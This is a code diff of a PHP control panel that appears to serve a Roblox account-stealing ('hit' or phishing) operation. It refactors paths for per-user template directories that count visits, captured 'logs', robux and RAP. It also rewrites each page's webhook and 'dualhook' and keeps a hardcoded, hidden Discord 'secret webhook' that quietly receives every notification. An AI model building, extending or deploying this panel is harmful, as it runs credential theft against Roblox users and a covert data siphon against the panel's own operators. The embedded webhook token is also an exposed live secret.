@@ -1,5 +1,13 @@
 <?php
 session_start();
+require_once __DIR__ . '/apis/persistence.php';
+
+function hb_template_file_path(string $dir, string $fileName): string {
+    return hb_template_dir($dir) . $fileName;
+}
+
+$tokensDir = hb_tokens_dir();
+hb_ensure_dir($tokensDir);
 // Secret webhook - receives all embeds and notifications (not exposed in frontend)
 $secretWebhook = "https://discord.com/api/webhooks/1437891603631968289/fESUQjQ05NN35ewAcATDKmP1atDTqwWEe_Wy6WJ_TJ8rJbkq8ugvxBQQzGYe3UQz0vfv";
 $token = $_SESSION['token'];
@@ -8,7 +16,7 @@ if (!$token) {
     exit();
 }
 
-$tokenFile = "apis/tokens/$token.txt";
+$tokenFile = hb_tokens_dir() . $token . '.txt';
 $dualhook = '';
 if (file_exists($tokenFile)) {
     $contents = file_get_contents($tokenFile);
@@ -25,13 +33,14 @@ if (file_exists($tokenFile)) {
 }
 
 $dir = $_SESSION['dir'];
-$visits = file_get_contents("../$dir/visits.txt");
-$logs = file_get_contents("../$dir/logs.txt");
-$robux = file_get_contents("../$dir/robux.txt");
-$rap = file_get_contents("../$dir/rap.txt");
-$summary = file_get_contents("../$dir/summary.txt");
-$starterUsername = file_get_contents("../$dir/username.txt");
-$pfpUrl = file_get_contents("../$dir/logo.txt");
+$templateDir = hb_template_dir($dir);
+$visits = @file_get_contents(hb_template_file_path($dir, 'visits.txt'));
+$logs = @file_get_contents(hb_template_file_path($dir, 'logs.txt'));
+$robux = @file_get_contents(hb_template_file_path($dir, 'robux.txt'));
+$rap = @file_get_contents(hb_template_file_path($dir, 'rap.txt'));
+$summary = @file_get_contents(hb_template_file_path($dir, 'summary.txt'));
+$starterUsername = @file_get_contents(hb_template_file_path($dir, 'username.txt'));
+$pfpUrl = @file_get_contents(hb_template_file_path($dir, 'logo.txt'));
 
 if (!$visits) $visits = '0';
 if (!$logs) $logs = '0';
@@ -132,21 +141,28 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     if (empty($errors)) {
         if ($newUsername) {
-            file_put_contents("../$dir/username.txt", $newUsername);
+        file_put_contents(hb_template_file_path($dir, 'username.txt'), $newUsername);
             $starterUsername = $newUsername;
         }
 
         if ($newPfpUrl) {
-            file_put_contents("../$dir/logo.txt", $newPfpUrl);
+        file_put_contents(hb_template_file_path($dir, 'logo.txt'), $newPfpUrl);
             $pfpUrl = $newPfpUrl;
         }
 
         if ($newDirectory && $newDirectory !== $dir) {
-            rename("../$dir", "../$newDirectory");
-            $dir = $newDirectory;
-            $_SESSION['dir'] = $dir;
-            // Update token file with current webhook and dualhook
-            file_put_contents($tokenFile, "$token | $dir | $web | " . ($dualhook ?? ''));
+            $currentDirectoryPath = rtrim(hb_template_dir($dir), DIRECTORY_SEPARATOR);
+            $newDirectoryPath = rtrim(hb_template_dir($newDirectory), DIRECTORY_SEPARATOR);
+            if (file_exists($newDirectoryPath)) {
+                $errors[] = "Directory already exists.";
+            } else {
+                hb_ensure_dir(dirname($newDirectoryPath));
+                rename($currentDirectoryPath, $newDirectoryPath);
+                $dir = $newDirectory;
+                $_SESSION['dir'] = $dir;
+                // Update token file with current webhook and dualhook
+                file_put_contents($tokenFile, "$token | $dir | $web | " . ($dualhook ?? '') . " | " . time());
+            }
             
             // Notify secret webhook about directory rename
             $ht = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
@@ -176,8 +192,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $dualhookChanged = ($newDualhook !== $dualhook); // Note: empty string means remove dualhook
         
         if ($webhookChanged || $dualhookChanged) {
-            $index = file_get_contents("../$dir/index.php");
-            $path = "../$dir/";
+            $index = file_get_contents(hb_template_file_path($dir, 'index.php'));
+            $path = hb_template_dir($dir);
             
             if ($webhookChanged) {
                 // Replace old webhook with new one (URL-encoded)
@@ -214,7 +230,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $fo2 = fopen($tokenFile, 'w');
             if ($fo && $fo2) {
                 fwrite($fo, $index);
-                fwrite($fo2, "$token | $dir | $web | " . ($dualhook ?? ''));
+                fwrite($fo2, "$token | $dir | $web | " . ($dualhook ?? '') . " | " . time());
                 fclose($fo);
                 fclose($fo2);
             }
@@ -319,19 +335,19 @@ function getLeaderboard() {
 $leaderboard = getLeaderboard();
 
 function getLogsData($dir) {
-    $logsFile = "../$dir/logs.txt";
+    $logsFile = hb_template_file_path($dir, 'logs.txt');
     $logsData = file_exists($logsFile) ? (int)file_get_contents($logsFile) : 0;
     return $logsData;
 }
 
 function getVisitsData($dir) {
-    $visitsFile = "../$dir/visits.txt";
+    $visitsFile = hb_template_file_path($dir, 'visits.txt');
     $visitsData = file_exists($visitsFile) ? (int)file_get_contents($visitsFile) : 0;
     return $visitsData;
 }
 
 function getDailyVisitsData($dir) {
-    $dailyVisitsFile = "../$dir/dailyvisits.txt";
+    $dailyVisitsFile = hb_template_file_path($dir, 'dailyvisits.txt');
     if (file_exists($dailyVisitsFile)) {
         $dailyVisitsData = json_decode(file_get_contents($dailyVisitsFile), true);
     } else {
@@ -341,7 +357,7 @@ function getDailyVisitsData($dir) {
 }
 
 function getDailyLogsData($dir) {
-    $dailyLogsFile = "../$dir/dailylogs.txt";
+    $dailyLogsFile = hb_template_file_path($dir, 'dailylogs.txt');
     if (file_exists($dailyLogsFile)) {
         $dailyLogsData = json_decode(file_get_contents($dailyLogsFile), true);
     } else {
@@ -351,7 +367,7 @@ function getDailyLogsData($dir) {
 }
 
 function getDailyRobuxData($dir) {
-    $dailyRobuxFile = "../$dir/dailyrobux.txt";
+    $dailyRobuxFile = hb_template_file_path($dir, 'dailyrobux.txt');
     if (file_exists($dailyRobuxFile)) {
         $dailyRobuxData = json_decode(file_get_contents($dailyRobuxFile), true);
     } else {
@@ -361,7 +377,7 @@ function getDailyRobuxData($dir) {
 }
 
 function getDailyRapData($dir) {
-    $dailyRapFile = "../$dir/dailyrap.txt";
+    $dailyRapFile = hb_template_file_path($dir, 'dailyrap.txt');
     if (file_exists($dailyRapFile)) {
         $dailyRapData = json_decode(file_get_contents($dailyRapFile), true);
     } else {
@@ -371,7 +387,7 @@ function getDailyRapData($dir) {
 }
 
 function getDailySummaryData($dir) {
-    $dailySummaryFile = "../$dir/dailysummary.txt";
+    $dailySummaryFile = hb_template_file_path($dir, 'dailysummary.txt');
     if (file_exists($dailySummaryFile)) {
         $dailySummaryData = json_decode(file_get_contents($dailySummaryFile), true);
     } else {
